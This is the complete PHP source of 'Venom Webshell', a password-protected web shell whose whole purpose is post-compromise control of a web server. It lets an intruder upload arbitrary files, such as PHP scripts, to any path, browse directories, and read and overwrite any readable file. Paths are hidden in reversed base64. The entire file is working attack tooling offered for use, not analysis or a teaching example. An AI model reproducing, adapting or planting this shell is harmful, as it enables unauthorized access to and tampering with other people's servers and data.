<?php
session_start();
error_reporting(0);

// 4f41243847da693a4f356c0486114bc6 = deadbeef
$hash_pwd = "4f41243847da693a4f356c0486114bc6";

function validate_pwd($hash, $pwd){
    if($hash == md5($pwd)){
        return True;
    }
}

if(isset($_POST['pwd'])){
    $pwd = $_POST["pwd"];

    if(validate_pwd($hash_pwd, $pwd) == 1){

        session_start();
        $_SESSION["xboi"] = "p34c3";

    }
}

if(empty($_SESSION['xboi'])){
    echo "<form action='' method='post'>";
    echo "<input name='pwd' placeholder='password'>&nbsp";
    echo "<input type='submit' value='Login'>";
    echo "</form>";
    die(0);
}



?>

<!DOCTYPE html>
<html lang="en">

<title>Venom</title>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>

</head>
<body>


<nav class="navbar navbar-default">
    <div class="container-fluid">
        <div class="navbar-header">
            <a class="navbar-brand" href="#">Venom</a>
        </div>
        <ul class="nav navbar-nav">
            <li class="active"><a href="">Home</a></li>
            <li><a href="https://www.exploit-db.com/">Exploit DB</a></li>
        </ul>
    </div>
</nav>

<div class="container">
    <h3>Venom Webshell</h3>
    <blockquote>I make tools which break break tools.</blockquote>
</div>

<div class="container">
    <div class="dropdown">
        <button class="btn btn-success dropdown-toggle" type="button" data-toggle="dropdown">Actions
            <span class="caret"></span></button>
        <ul class="dropdown-menu">
            <li><a data-toggle="modal" href="#uploadModal">Upload Files</a></li>
        </ul>
    </div>
</div>

<div class="container">
    <div class="modal fade" id="uploadModal" role="dialog">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                    <h4 class="modal-title">Upload files</h4>
                </div>
                <div class="modal-body">

                    <form action="" method="POST" enctype="multipart/form-data">
                        <input type="file" name="myfile" /><br>
                        <div class="form-group row">

                            <div class="col-xs-4">
                                <label for="ex3">Upload Path</label>
                                <input name="upload_path" class="form-control" id="ex3" type="text" value="<?php echo getcwd()."/";?>">
                            </div>

                            <div class="col-xs-2">
                                <label for="ex1">Filename</label>
                                <input name="filename" class="form-control" id="ex1" type="text" placeholder="x.php">
                            </div>

                        </div>
                        <input class="btn btn-default" type="submit" value="Upload"/>

                    </form>

                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>
</div>




<?php



// global variables
$GLOBALS['path'] = bdecode($_GET["path"]);


$file_upload_check = $_FILES["myfile"];


if($file_upload_check != NULL){
    $upload_path = $_POST["upload_path"];
    $filename = $_POST["filename"];

    // calling upload function
    upload_files($upload_path, $filename);

}

function upload_files($upload_path, $filename){

    $main_path = $upload_path.$filename;
    if(copy($_FILES["myfile"]["tmp_name"], $main_path)){

        echo "<script>alert(\"File Uploaded to: . $main_path. \")</script>";

    }

    header("refresh: 0.1");
}


function bencode($data){
    $result = strrev(base64_encode($data));
    return $result;
}

function bdecode($data){
    $rev = strrev($data);
    $result = base64_decode($rev);
    return $result;
}

function check_filepermission($filepath){

    $perms = fileperms($filepath);

    switch ($perms & 0xF000) {
        case 0xC000: // socket
            $info = 's';
            break;
        case 0xA000: // symbolic link
            $info = 'l';
            break;
        case 0x8000: // regular
            $info = 'r';
            break;
        case 0x6000: // block special
            $info = 'b';
            break;
        case 0x4000: // directory
            $info = 'd';
            break;
        case 0x2000: // character special
            $info = 'c';
            break;
        case 0x1000: // FIFO pipe
            $info = 'p';
            break;
        default: // unknown
            $info = 'u';
    }

// Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x' ) :
        (($perms & 0x0800) ? 'S' : '-'));

// Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x' ) :
        (($perms & 0x0400) ? 'S' : '-'));

// World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x' ) :
        (($perms & 0x0200) ? 'T' : '-'));

    echo $info;

}

function openFiles($filepath){
    // this function opens the files and offers: editing, writing, reading on specific file.


    if(is_readable($filepath) ){

        $get_contents = htmlspecialchars(file_get_contents($filepath));

        ?>


        <!-- Open files modal -->
        <div class="modal fade" id="openFilesModal">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">

                    <!-- Modal Header -->
                    <div class="modal-header">
                        <h4 class="modal-title">File: <?php echo $filepath;?></h4>
                        <button type="button" class="close" data-dismiss="modal">&times;</button>
                    </div>

                    <!-- Modal body -->
                    <div class="modal-body">
                        <!-- displays file content on the modal. -->
                        <form action="" method="post">
                            <div class="form-group">
                                <label for="exampleFormControlTextarea1">Code:</label>
                                <textarea name="text_content" class="form-control rounded-0" id="exampleFormControlTextarea1" rows="10"><?php  echo $get_contents;  ?></textarea>
                            </div>

                    </div>

                    <!-- Modal footer -->
                    <div class="modal-footer">

                        <button name="savefile_btn" type="submit" class="btn btn-secondary">save</button>
                        <!--<button name="savefile_btn" type="submit" class="btn btn-primary" data-dismiss="modal">Save
                            changes</button>-->
                        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    </div>
                    </form>


                </div>
            </div>
        </div>

        </form>

        <?php

        if(isset($_POST["savefile_btn"])){
            $fp = fopen($filepath, "w+");
            if(fwrite($fp, $_POST["text_content"])){
                header("refresh: 0.1");
                echo "<script>alert('File Written')</script>";

            }else{
                echo "<script>alert(\"File not written.\");</script>";
            }

            fclose($fp);
        }
    }else{
        die("<script>alert(\"File don't have read permissions.\");</script>");
    }

}

function listallFiles($path){

    if(is_dir($path)){
        chdir($path);
    }


    $current_path_after_change = getcwd();

    $files_and_dir =     glob("*");
    $fd_count      =     count($files_and_dir);



    echo "<center>Current DIR: " . $current_path_after_change."</center><br><br>";
    ?>

    <!-- Table start -->

    <div class="container">
        <table class="table table-striped">
            <thead>
            <tr>
                <th>Files</th>
                <th>File Type</th>
                <th>Permission</th>
            </tr>
            </thead>

            <?php
            foreach ($files_and_dir as $files){

                if(is_dir($files)){
                    // if directory execute this
                    //echo $files  ." -> DIR"."<br>";
                    // all codes opening and link directories goes here.

                    ?>

                    <!-- this tbody could be used for the files listing too -->
                    <tbody>
                    <tr>
                        <td><?php echo "<a href='?path=".bencode($current_path_after_change."/".$files."/")."'>$files<a/><br>"; ?></td>
                        <td>DIR</td>
                        <td><?php check_filepermission($files); ?></td>
                    </tr>
                    </tbody>

                    <?php


                }else{

                    $filename = $_GET["filename"];
                    ?>
                    <tbody>
                    <tr>

                        <td><?php echo "<a href='?path=".bencode($current_path_after_change."/".$files)."&filename=".bencode($files)."'>$files<a/><br>";?></td>
                        <td>FILE</td>
                        <td><?php check_filepermission($files); ?></td>
                    </tr>
                    </tbody>

                    <?php

                }

            }
            ?>

        </table>
    </div>


    <?php

    if(isset($filename)){
        // this section helps opening files

        echo "<script type='text/javascript'>
        $(document).ready(function(){
        $('#openFilesModal').modal('show');     
       
        });
        </script>";
        openFiles(bdecode($filename));

    }

}


function changePath($path){

    $current_path = getcwd();
    $explode_path = explode("/", $current_path);
    $total_arr_elements = count($explode_path);

    $emp_string = "";
    echo "<center><b  width='80%' align='center'>Navigate DIR: </b>";
    for($i = 0; $i < $total_arr_elements; $i++){

        // appends directory after directory from an array var $explode_path to a string var $emp_string
        $emp_string .= $explode_path[$i]."/";
        echo "<a href='?path=".bencode($emp_string)."'>$explode_path[$i]/</a>";

    }

    echo "</center>";



    // requests the path thru GET parameter
    if( isset($path) && !empty($path) ){
        echo "<br>";
        listallFiles($path);
    }


}

changePath($path);

?>

</body>
</html>
